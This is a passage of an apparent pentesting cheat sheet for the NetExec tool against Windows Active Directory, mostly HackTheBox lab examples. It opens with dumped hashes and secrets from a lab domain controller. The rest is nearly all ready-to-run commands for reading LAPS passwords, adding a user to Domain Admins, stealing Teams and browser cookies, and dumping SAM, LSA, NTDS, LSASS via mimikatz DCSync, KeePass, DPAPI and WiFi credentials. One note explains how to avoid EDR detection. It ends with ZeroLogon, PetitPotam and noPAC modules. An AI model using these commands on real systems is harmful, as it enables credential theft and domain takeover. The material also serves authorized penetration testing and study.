$MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8\nBACKUP_O... 10.10.11.35     445    CICADA-DC        $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696\nBACKUP_O... 10.10.11.35     445    CICADA-DC        dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71\nBACKUP_O... 10.10.11.35     445    CICADA-DC        NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Dumping NTDS...\nSMB         10.10.11.35     445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.10.11.35     445    CICADA-DC        [-] Could not connect: timed out\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Cleaning dump with user Administrator and hash 2b87e7c93a3e8a0ea4a581937016f341 on domain cicada.htb\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Successfully deleted dump files !\nDefeating LAPS\nUsing NetExec when LAPS installed on the domain\nIf LAPS is used inside the domain, is can be hard to use NetExec to execute a command on every\ncomputer on the domain.\nTherefore, a new core option has been added --laps ! If you have compromised an accout that can read LAPS password you can use NetExec like this\nin this case , we can see our user can read Laps password.\n\nnow let’s use nxc  to do this attack\n❯ nxc winrm &lt;IP&gt; -u username -p &#039;password&#039; --laps\n\nokay that’s our LAPS password.\nManual Way to Read Laps Password\nGet-ADComputer DC01 -property &#039;ms-mcs-admpwd&#039;\n\nnow let’s try to connect as administrator with that password &amp; see if it works or not\n❯ evil-winrm -i timelapse.htb -S -u administrator -p &#039;q.p+T{80W7t4Er#jzl]OcI6O&#039;\n\nbingo!! it works :D\nDumping All Files from SMB\n❯ nxc smb 10.10.10.10 -u &#039;user&#039; -p &#039;pass&#039; -M spider_plus -o DOWNLOAD_FLAG=True\nGet and Put Files\nSend a File to the Remote Target\nSend a local file to the remote target\n❯ nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt\nGet a File From the Remote Target\nGet a remote file on the remote target\n❯ nxc smb 172.16.251.152 -u user -p pass --get-file  \\\\Windows\\\\Temp\\\\whoami.txt /tmp/whoami.txt\nChecking for Spooler &amp; WebDav\nChecking if the Spooler Service is Running\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M spooler\nChecking if the WebDav Service is Running\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M webdav\nImpersonate logged-on Users\nUse Sessions from logged-on Users to execute arbitrary commands using schtask_as\n\nYou need at least local admin privilege on the remote target\n\nThe Module schtask_as can execute commands on behalf on other users which has sessions on the target\nAttack Vector :\n\nEnumerate logged-on users on your Target\n\n❯ nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; --loggedon-users\n\nExecute commands on behalf of other users\n\n❯ nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; -M schtask_as -o USER=&lt;logged-on-user&gt; CMD=&lt;cmd-command&gt;\n\nCustom command to add an user to the domain admin group for easy copy &amp; pasting:\npowershell.exe \\&quot;Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity &#039;Domain Admins&#039; -Members USER.NAME}\\&quot;\nSteal Microsoft Teams Cookies\n\nYou need at least local admin privilege on the remote target\n\nNew NetExec module to dump Microsoft Teams cookies. You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.\n❯ nxc smb &lt;ip&gt; -u user -p pass -M teams_localdb\nObtaining Credentials\nDump SAM\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n❯ nxc smb 192.168.1.0/24 -u UserNAme -p &#039;PASSWORDHERE&#039; --sam\nDump LSA\n\nRequires Domain Admin or Local Admin Priviledges on target Domain Controller\n\n❯ nxc smb 192.168.1.0/24 -u UserNAme -p &#039;PASSWORDHERE&#039; --lsa\nDump NTDS.dit\n\nRequires Domain Admin or Local Admin Priviledges on target Domain Controller\n\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds --users\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds --users --enabled\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds vss\n\nYou can also DCSYNC with the computer account of the DC\n\nThere is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; -M ntdsutil\nDump LSASS\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\nUsing Lsassy\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy\nUsing nanodump\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump\nusing MimiKatz\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz\n \n❯ nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND=&#039;&quot;lsadump::dcsync /domain:domain.local /user:krbtgt&quot;\nDump KeePass\n❯ nxc smb &lt;ip&gt; -u user -p pass -M keepass_discover\n❯ nxc smb &lt;ip&gt; -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH=&quot;path_from_module_discovery&quot;\nDump DPAPI\nyou can dump all secrets from Credential Manager, Chrome, Edge, Firefox\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n\ncookies : Collect every cookies in browsers\nnosystem : Won’t collect system credentials. This will prevent EDR from stopping you from looting passwords 🔥\n\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi cookies\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi nosystem\nDump WIFI password\nGet the WIFI password register in Windows\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n❯ nxc smb &lt;ip&gt; -u user -p pass -M wireless\nExtract gMSA Secrets\nConvert gSAM id, convert gmsa lsa to ntlm\nNetExec offer multiple choices when you found a gmsa account in the LSA\n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724\n \n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa-decrypt-lsa &#039;_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000&#039;\nScan for Vulnerabilities\nWhen you start your internal pentest, these are the first modules you should try:\nZeroLogon\n❯ nxc smb &lt;ip&gt; -u &#039;&#039; -p &#039;&#039; -M zerologon\nPetitPotam\n❯ nxc smb &lt;ip&gt; -u &#039;&#039; -p &#039;&#039; -M petitpotam\nnoPAC\n\nYou need a credential for this one\n\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M nopac\nAllChecks\n❯ nxc smb authority.htb -u svc_ldap -p &#039;lDaP_1n_th3_cle4r!&#039; -M coerce_plus "}}